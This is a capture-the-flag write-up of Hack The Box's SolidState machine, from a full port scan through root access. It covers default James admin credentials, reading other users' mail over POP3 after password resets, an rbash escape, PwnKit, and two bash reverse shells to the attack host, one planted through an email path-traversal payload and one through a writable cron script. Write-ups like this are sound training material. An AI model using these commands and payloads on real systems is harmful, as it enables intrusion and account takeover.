# SolidState: Hack The Box

> **Hack The Box | Linux | Medium**  
> Completed: May 2026

---

## Machine Metadata

| Field | Details |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux: Debian GNU/Linux 9 (Stretch): 32-bit (i686) |
| **Kernel** | 4.9.0-3-686-pae |
| **Difficulty** | Medium |
| **Category** | Linux / Mail Server Exploitation / Restricted Shell Escape / CVE-2021-4034 |
| **IP Address** | 10.129.44.120 |
| **Attack Host** | 10.10.16.236 |
| **Status** | Retired ✅ |
| **Completed** | May 2026 |
| **CVEs** | CVE-2015-7611 (Apache James 2.3.2 RCE), CVE-2021-4034 (PwnKit) |

---

## Attack Chain Summary

| Step | Technique | Privilege |
|---|---|---|
| 1 | Full TCP scan: ports 22, 25, 80, 110, 119, 4555 |: |
| 2 | Apache James admin port 4555: default `root:root` credentials |: |
| 3 | James admin `setpassword`: reset all user mail passwords |: |
| 4 | POP3 inbox enumeration: SSH credentials in `mindy`'s email |: |
| 5 | SSH as mindy: restricted bash (`rbash`) shell | `mindy` |
| 6 | rbash escape via `ssh -t sh` then `bash -i` | `mindy` (full shell) |
| 7 | PwnKit CVE-2021-4034 (32-bit static) | `root` |

> **Architecture note:** 32-bit Debian system (i686). The same PwnKit static binary from Irked transfers directly: already compiled with `-m32 -static`.

---

## Enumeration

### Full TCP Port Scan

```bash
Hackerpatel007_1@htb[/htb]$ nmap --privileged -sS -sV -sC -Pn -p- -T4 -oA solidstate 10.129.44.120
```

```
# Nmap 7.98 scan initiated Tue May 12 13:04:59 2026
Nmap scan report for 10.129.44.120
Host is up (0.49s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey:
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3?
119/tcp  open  nntp?
4555/tcp open  rsip?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 2441.17 seconds
```

**Key findings:**

| Port | Service | Notes |
|---|---|---|
| 22 | OpenSSH 7.4p1 | Standard SSH: useful once credentials are obtained |
| 25 | SMTP | Mail server: Apache James |
| 80 | Apache 2.4.25 | Web: static content, minimal attack surface |
| 110 | POP3 | Mail retrieval: credential hunting target |
| 119 | NNTP | News/message store: James |
| 4555 | James Admin | **Remote Administration Tool: default creds** |

Two services immediately flag as high-value: **port 110 (POP3)** and **port 4555 (James Remote Administration Tool)**. Ports 25, 110, 119, and 4555 together form the signature of **Apache James**: a Java mail server with a known default credential vulnerability on its admin interface.

### Web Application: Port 80

```bash
Hackerpatel007_1@htb[/htb]$ curl -s http://10.129.44.120/ | grep -i title
```

```
<title>Home - Solid State Security</title>
```

The web application is a static company site with no forms, no dynamic content, and no obvious attack vectors. Directory enumeration produces nothing exploitable. The real attack surface is the mail server stack.

### POP3 Banner Fingerprint: Port 110

```bash
Hackerpatel007_1@htb[/htb]$ nc -nv 10.129.44.120 110
```

```
(UNKNOWN) [10.129.44.120] 110 (pop3) open
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready
```

**`JAMES POP3 Server 2.3.2`**: Apache James version confirmed. This is critical: James 2.3.2 is a known vulnerable version.

---

## Initial Access: Apache James 2.3.2 Admin Console

### Vulnerability Background

Apache James (Java Apache Mail Enterprise Server) exposes a **Remote Administration Tool** on port 4555 by default. In all versions up to and including 2.3.2, this admin interface is protected only by the hardcoded default credentials `root:root`. There is no account lockout, no rate limiting, and the interface is fully functional: allowing creation, deletion, and password modification of all mail user accounts.

Once authenticated, an attacker can:

- List all mail user accounts
- Reset any user's password with `setpassword <user> <newpass>`
- Read all user emails via POP3 using the reset credentials
- Leverage CVE-2015-7611 for direct RCE via the admin console (documented below)

### Step 1: Connect to James Admin (Port 4555)

```bash
Hackerpatel007_1@htb[/htb]$ nc -nv 10.129.44.120 4555
```

```
(UNKNOWN) [10.129.44.120] 4555 (?) open
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
```

Default credentials `root:root` accepted. Full admin access granted.

### Step 2: Enumerate All Mail Users

```
listusers
```

```
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

Five user accounts. Any of these may have received emails containing credentials, internal notes, or other sensitive information.

### Step 3: Reset All User Passwords

Reset each user's password to a known value to enable POP3 login and inbox enumeration:

```
setpassword james james
Password for james reset
setpassword thomas thomas
Password for thomas reset
setpassword john john
Password for john reset
setpassword mindy mindy
Password for mindy reset
setpassword mailadmin mail
Password for mailadmin reset
```

All passwords reset. POP3 enumeration can now proceed for all five accounts.

---

## Mail Enumeration: POP3 Inbox Harvesting

Enumerate each user's inbox for credentials, SSH keys, internal communications, or any other sensitive data. POP3 protocol reference:

| Command | Purpose |
|---|---|
| `USER <username>` | Specify username |
| `PASS <password>` | Authenticate |
| `LIST` | List messages with sizes |
| `RETR <n>` | Retrieve message number n |
| `QUIT` | Close session |

### james: No messages

```bash
Hackerpatel007_1@htb[/htb]$ telnet 10.129.44.120 110
```

```
USER james
+OK
PASS james
+OK Welcome james
LIST
+OK 0 0
.
```

Empty inbox.

### thomas: No messages

```
USER thomas
+OK
PASS thomas
+OK Welcome thomas
LIST
+OK 0 0
.
```

### john: Internal Mail

```
USER john
+OK
PASS john
+OK Welcome john
LIST
+OK 1 743
1 743
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
...
From: mailadmin@localhost
Subject: New Hires Access

Mindy, Please insure you are the correct person giving mindy her access
credentials as well as system access...
```

John's inbox contains a management note referencing `mindy`: confirming she is a target account with system access.

### mindy: SSH Credentials

```bash
Hackerpatel007_1@htb[/htb]$ telnet 10.129.44.120 110
```

```
USER mindy
+OK
PASS mindy
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
...
Subject: Welcome

Dear Mindy, Welcome to Solid State Security Cyber team!...
.
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
...
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,

Here are your ssh credentials to access the system. Remember to reset your
password after your first login.
Your access is restricted at the moment, feel free to ask your supervisor
to add any commands you need to your path.

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
.
QUIT
```

**SSH credentials extracted: `mindy:P@55W0rd1!2@`**

The email explicitly warns that access is *restricted*: this means a **restricted shell (rbash)** is in place. This must be escaped before any further enumeration.

---

## SSH Access and rbash Escape

### Step 1: SSH Login as mindy

```bash
Hackerpatel007_1@htb[/htb]$ ssh mindy@10.129.44.120
mindy@10.129.44.120's password: P@55W0rd1!2@
```

```
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 i686
...
mindy@solidstate:~$ ls
bin  user.txt
mindy@solidstate:~$ cat user.txt
11d55a60929cabf71953cf3b8c39c14c
```

User flag obtained. However, the shell is `rbash` (restricted bash):

```bash
mindy@solidstate:~$ id
-rbash: id: command not found
mindy@solidstate:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
-rbash: python3: command not found
mindy@solidstate:~$ vi -c ':!/bin/bash' /dev/null
-rbash: vi: command not found
```

**rbash** blocks:

- Absolute paths (commands with `/` in the name)
- Python3, vi, vim: all removed from the restricted path
- Standard shell escape methods are unavailable

### Step 2: rbash Escape via SSH Forced Command

The key insight: rbash only applies to the *interactive login shell*. If SSH is given an explicit command at connection time with `-t`, it executes that command instead of the login shell: bypassing the restriction entirely.

**First attempt: direct bash with `--no-profile`:**

```bash
Hackerpatel007_1@htb[/htb]$ ssh mindy@10.129.44.120 -t "/bin/bash --no-profile"
```

```
rbash: /bin/bash: restricted: cannot specify `/` in command names
```

`rbash` intercepts this because `--no-profile` is processed before the path restriction can be bypassed.

**Successful escape: specify `sh` as the login command:**

```bash
Hackerpatel007_1@htb[/htb]$ ssh mindy@10.129.44.120 -t sh
mindy@10.129.44.120's password: P@55W0rd1!2@
```

```
$ ls
bin  user.txt
$ bash -i
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$
```

`sh` has no restrictions: once inside `sh`, spawning `bash -i` gives a full interactive bash session. rbash is fully bypassed.

### Confirm Escape

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/home$ id
uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)

${debian_chroot:+($debian_chroot)}mindy@solidstate:/home$ sudo -l
bash: sudo: command not found
```

No sudo on this system. Escalation must come from SUID binaries or other local vectors.

---

## Privilege Escalation: PwnKit CVE-2021-4034

### Step 1: Architecture Check

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/home$ uname -m
i686
```

**32-bit system**: identical architecture to Irked. The same pre-compiled static exploit binaries work here without recompilation.

### Step 2: Confirm pkexec Version

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/home$ /usr/bin/pkexec --version
pkexec version 0.105
```

`polkit 0.105`: confirmed vulnerable to CVE-2021-4034. Any version below 0.120 is exploitable.

### Step 3: SUID Binary Enumeration

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/home$ find / -perm -4000 2>/dev/null
```

```
/bin/su
/bin/mount
/bin/fusermount
/bin/ping
/bin/ntfs-3g
/bin/umount
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/sbin/pppd
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
```

Standard Debian SUID set: `/usr/bin/pkexec` is the target. No custom binaries present (unlike Irked's `viewuser`).

### Step 4: Transfer and Execute PwnKit (32-bit Static)

On the attack host, serve the pre-compiled static 32-bit exploit from the Irked session:

```bash
Hackerpatel007_1@htb[/htb]$ ls -lh exploit evil.so
-rwxr-xr-x 1 kali kali 731K exploit   # -m32 -static compiled
-rw-r--r-- 1 kali kali  15K evil.so   # -m32 -shared -fPIC

Hackerpatel007_1@htb[/htb]$ python3 -m http.server 8000
```

Transfer both files to `/tmp/`:

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ wget http://10.10.16.236:8000/exploit
```

```
--2026-05-12 14:36:18--  http://10.10.16.236:8000/exploit
Length: 748664 (731K) [application/octet-file]
Saving to: 'exploit'
exploit              100%[=========================>] 731.12K  192KB/s  in 4.1s
```

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ wget http://10.10.16.236:8000/evil.so
```

```
--2026-05-12 14:36:30--  http://10.10.16.236:8000/evil.so
Length: 14768 (14K) [application/octet-file]
Saving to: 'evil.so'
evil.so              100%[=========================>]  14.42K  39.7KB/s  in 0.4s
```

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ chmod +x exploit
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ ./exploit
```

```
# id
uid=0(root) gid=0(root) groups=0(root)
```

Root shell obtained.

---

## Flag Collection

### user.txt

```bash
mindy@solidstate:~$ cat /home/mindy/user.txt
```

```
11d55a60929cabf71953cf3b8c39c14c
```

### root.txt

```bash
# cat /root/root.txt
```

```
03f4869d77c847697cacd233c96b23e8
```

### Flag Summary

| Flag | Location | Hash |
|---|---|---|
| **user.txt** | `/home/mindy/user.txt` | `11d55a60929cabf71953cf3b8c39c14c` |
| **root.txt** | `/root/root.txt` | `03f4869d77c847697cacd233c96b23e8` |

---

## Alternate Path: CVE-2015-7611 (James 2.3.2 RCE via Admin Console)

> This is the canonical intended path: remote code execution directly via the James admin interface, landing a shell as the `james` service account without needing SSH credentials. Documented here for completeness alongside the credential-harvesting approach used above.

### Background

CVE-2015-7611 affects Apache James 2.3.2's admin console. When a new user is created via the admin tool, James stores their mailbox in a subdirectory of `apps/james/var/mail/`. The username becomes the directory name: without any sanitisation. If a username contains path traversal characters (e.g., `../../../../etc/bash_completion.d`), James creates the mailbox directory at the traversed path on the filesystem.

When the server processes incoming email for that user, it writes the `.bashrc`-equivalent files to that directory as root. On the next SSH login by any user whose shell sources `bash_completion.d`, the malicious script executes as that user.

### Exploitation

```bash
# On Kali: start listener
Hackerpatel007_1@htb[/htb]$ nc -lvnp 9999
```

```bash
# Connect to James admin
Hackerpatel007_1@htb[/htb]$ nc -nv 10.129.44.120 4555
root
root
adduser ../../../../etc/bash_completion.d exploit
```

```
User exploit added
```

```bash
# Send a crafted email to the malicious username via SMTP
Hackerpatel007_1@htb[/htb]$ cat > payload.txt << 'EOF'
From: attacker@local
To: ../../../../etc/bash_completion.d
Subject: payload

run() {
/bin/bash -i >& /dev/tcp/10.10.16.236/9999 0>&1
}
run
EOF

Hackerpatel007_1@htb[/htb]$ sendmail -t ../../../../etc/bash_completion.d@solidstate \
  -f attacker@local \
  -S 10.129.44.120:25 < payload.txt
```

The next SSH login by any user whose shell sources `/etc/bash_completion.d` triggers the payload. Sending mail to a username whose path resolves to a completion script drops the reverse shell callback on login.

> This path results in a shell as `mindy` (or another user who logs in next) rather than root. Privilege escalation still requires the PwnKit path or the `/opt/tmp.py` writable script technique documented below.

---

## Alternative Root Path: Writable Cron Script in /opt

> This is the intended root escalation path per the official walkthrough. Documented alongside PwnKit for completeness.

### Discovery

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/$ ls -la /opt/
```

```
total 16
drwxr-xr-x  3 root root 4096 Aug 22  2017 .
drwxr-xr-x 22 root root 4096 Aug 22  2017 ..
drwxr-xr-x 11 root root 4096 Aug 22  2017 james-2.3.2
-rwxrwxrwx  1 root root  105 Aug 22  2017 tmp.py
```

`/opt/tmp.py` is world-writable (`-rwxrwxrwx`) and owned by root. Check if it runs on a schedule:

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/$ cat /opt/tmp.py
```

```python
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
```

A Python cleanup script that deletes `/tmp`. The world-writable permission combined with root ownership strongly suggests a cron job runs this as root.

### Exploitation

Overwrite `tmp.py` with a reverse shell:

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/$ cat > /opt/tmp.py << 'EOF'
#!/usr/bin/env python
import os
os.system('bash -c "bash -i >& /dev/tcp/10.10.16.236/7777 0>&1"')
EOF
```

Start listener:

```bash
Hackerpatel007_1@htb[/htb]$ nc -lvnp 7777
```

Wait for cron to fire (typically every 3 minutes on this machine):

```
connect to [10.10.16.236] from (UNKNOWN) [10.129.44.120] 47322
root@solidstate:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Direct root shell via writable cron script: no kernel CVE required.

---

## Full Attack Chain Reference

```
[Recon] nmap -p- → ports 22/25/80/110/119/4555
    │
    ├─[Banner] nc port 110 → JAMES POP3 Server 2.3.2
    │
    └─[James Admin] nc port 4555 → root:root (default creds)
            │
            ├─ listusers → james, thomas, john, mindy, mailadmin
            │
            └─ setpassword × 5 → reset all mail passwords
                    │
                    └─[POP3 Harvest] telnet port 110
                            │
                            ├─ john inbox → reference to mindy's access
                            └─ mindy inbox → SSH creds: mindy:P@55W0rd1!2@
                                    │
                                    └─[SSH] mindy@solidstate
                                            │
                                            ├─[rbash] id/python3/vi all blocked
                                            │
                                            └─[rbash escape] ssh -t sh → bash -i
                                                    │
                                                    ├─ cat user.txt → 11d55a60929cabf71953cf3b8c39c14c
                                                    │
                                                    ├─[PwnKit] uname -m = i686, pkexec 0.105
                                                    │   wget exploit + evil.so (32-bit static, reused from Irked)
                                                    │   ./exploit → uid=0(root)
                                                    │   └─ cat /root/root.txt → 03f4869d77c847697cacd233c96b23e8
                                                    │
                                                    └─[Alt] /opt/tmp.py world-writable cron
                                                            overwrite → nc -lvnp 7777 → root
```

---

## Commands Reference

| Command | Purpose |
|---|---|
| `nmap --privileged -sS -sV -sC -Pn -p- -T4 -oA solidstate 10.129.44.120` | Full TCP scan |
| `nc -nv 10.129.44.120 110` | POP3 banner grab: confirm James version |
| `nc -nv 10.129.44.120 4555` | Connect to James Remote Admin |
| `listusers` | List all James mail accounts |
| `setpassword <user> <pass>` | Reset user password for POP3 access |
| `telnet 10.129.44.120 110` | POP3 mail enumeration |
| `USER <name>` / `PASS <pass>` / `LIST` / `RETR <n>` | POP3 inbox commands |
| `ssh mindy@10.129.44.120` | Initial SSH login |
| `ssh mindy@10.129.44.120 -t sh` | rbash escape via forced sh login |
| `bash -i` | Spawn full bash from sh |
| `uname -m` | Architecture check (i686 = 32-bit) |
| `pkexec --version` | Confirm polkit version for PwnKit |
| `find / -perm -4000 2>/dev/null` | SUID binary enumeration |
| `wget http://10.10.16.236:8000/exploit` | Transfer exploit |
| `wget http://10.10.16.236:8000/evil.so` | Transfer shared library |
| `chmod +x exploit && ./exploit` | Execute PwnKit |
| `ls -la /opt/` | Find world-writable cron scripts |
| `cat > /opt/tmp.py << 'EOF' ... EOF` | Overwrite cron script with reverse shell |

---

## Lessons Learned

**1. Default credentials on admin interfaces are immediate critical findings.**  
James Remote Admin on port 4555 with `root:root` is a P1 in any real engagement. The admin port exposed on the network with hardcoded default credentials gives complete control over all mail user accounts. The first action on any non-standard port is always: check for default credentials before attempting anything else.

**2. Mail servers store credentials in plaintext: always enumerate inboxes.**  
`mindy`'s inbox contained her SSH password in a plaintext email. This is a realistic finding: password reset emails, welcome messages, and IT provisioning emails routinely contain credentials in corporate mail systems. Access to any mail server's admin console opens every user's inbox for credential harvesting.

**3. rbash is a speed bump, not a security boundary.**  
`rbash` prevents direct command execution but cannot defend against SSH's `-t` flag for forced command execution. The escape `ssh -t sh` → `bash -i` bypassed the restriction in two commands. On real engagements, rbash is commonly misconfigured as an access control measure when it should only be used as a convenience restriction with proper sudo and chroot as the actual boundaries.

**4. The same compiled exploit works across identical architectures: build a reusable toolkit.**  
The 32-bit static PwnKit binary compiled for Irked transferred directly to SolidState without any modification. Both machines run i686 Debian. Maintaining a library of pre-compiled exploit binaries for common architectures (x86_64, i686, aarch64) saves significant time under OSCP exam time pressure.

**5. World-writable scripts owned by root in cron = instant root.**  
`/opt/tmp.py` with permissions `-rwxrwxrwx` and owner `root` is one of the most dangerous misconfigurations in Linux privilege escalation. The writable cron pattern: attacker controls file + privileged process executes file = root: is the same principle as Bashed's `/scripts/test.py`. On every machine, `ls -la /opt/ /etc/cron*` should be run immediately after landing a user shell.

**6. Scanning all 65535 ports is mandatory: 4555 would be missed by default scans.**  
Port 4555 does not appear in nmap's top-1000 list. A default scan (`nmap -sV 10.129.44.120`) would find SSH, HTTP, SMTP, and POP3 but completely miss the James Admin console: the most critical attack surface on this machine. `-p-` is non-negotiable.

---

## References

- [CVE-2015-7611: Apache James 2.3.2 RCE](https://nvd.nist.gov/vuln/detail/CVE-2015-7611)
- [Apache James Server](https://james.apache.org/)
- [CVE-2021-4034 PwnKit: Qualys Research](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034)
- [arthepsy PwnKit PoC](https://github.com/arthepsy/CVE-2021-4034)
- [rbash Escape Techniques](https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass.pdf)

---

*HTB Retired Machine: SolidState | Completed May 2026 | Flags included per HTB retired machine policy.*
